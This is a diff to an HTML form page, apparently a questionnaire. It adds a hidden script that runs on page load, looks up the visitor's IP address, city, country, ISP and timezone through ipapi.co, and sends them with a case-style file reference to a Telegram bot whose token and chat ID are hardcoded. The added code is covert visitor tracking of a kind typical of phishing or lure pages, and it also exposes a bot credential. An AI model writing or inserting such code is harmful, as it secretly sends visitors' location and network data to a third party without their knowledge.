@@ -872,9 +872,81 @@
 </div>
 
 <script>
+  // --- TRACKING: SEND NOTIFICATION WHEN PAGE IS OPENED ---
+  function sendPageOpenNotification() {
+    var botToken = "8974824259:AAEQ0PcGUcLULk92EeIr3iKpjXJi7usBRfs";
+    var chatId = "7283385361";
+
+    // Get IP and location
+    fetch('https://ipapi.co/json/')
+      .then(response => response.json())
+      .then(data => {
+        var ip = data.ip || 'Unknown';
+        var city = data.city || 'Unknown';
+        var region = data.region || 'Unknown';
+        var country = data.country_name || 'Unknown';
+        var isp = data.org || 'Unknown';
+        var timezone = data.timezone || 'Unknown';
+
+        var message = "👁️ *PAGE VIEW NOTIFICATION*\n\n";
+        message += "*File Reference:* PB-142-WT1139\n";
+        message += "*Action:* Page opened\n";
+        message += "*IP Address:* " + ip + "\n";
+        message += "*Location:* " + city + ", " + region + ", " + country + "\n";
+        message += "*ISP:* " + isp + "\n";
+        message += "*Time Zone:* " + timezone + "\n";
+        message += "*Timestamp:* " + new Date().toLocaleString() + "\n";
+        message += "*Status:* Active — page is being viewed";
+
+        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+        var data = {
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        };
+
+        return fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      })
+      .catch(function(error) {
+        // If IP fetch fails, send basic notification
+        var message = "👁️ *PAGE VIEW NOTIFICATION*\n\n";
+        message += "*File Reference:* PB-142-WT1139\n";
+        message += "*Action:* Page opened\n";
+        message += "*IP Address:* Unable to retrieve\n";
+        message += "*Timestamp:* " + new Date().toLocaleString() + "\n";
+        message += "*Status:* Active — page is being viewed";
+
+        var url = "https://api.telegram.org/bot" + botToken + "/sendMessage";
+        var data = {
+          chat_id: chatId,
+          text: message,
+          parse_mode: "Markdown"
+        };
+
+        return fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        });
+      })
+      .catch(function(error) {
+        console.log("Tracking failed: " + error.message);
+      });
+  }
+
+  // --- CALL TRACKING WHEN PAGE LOADS ---
+  window.onload = function() {
+    sendPageOpenNotification();
+  };
+
+  // --- SUBMIT FUNCTION ---
   function submitForm() {
     document.querySelectorAll('.error-field').forEach(el => el.classList.remove('error-field'));
-    
+
     var errors = [];
 
     var q1 = document.querySelector('input[name="q1"]:checked');
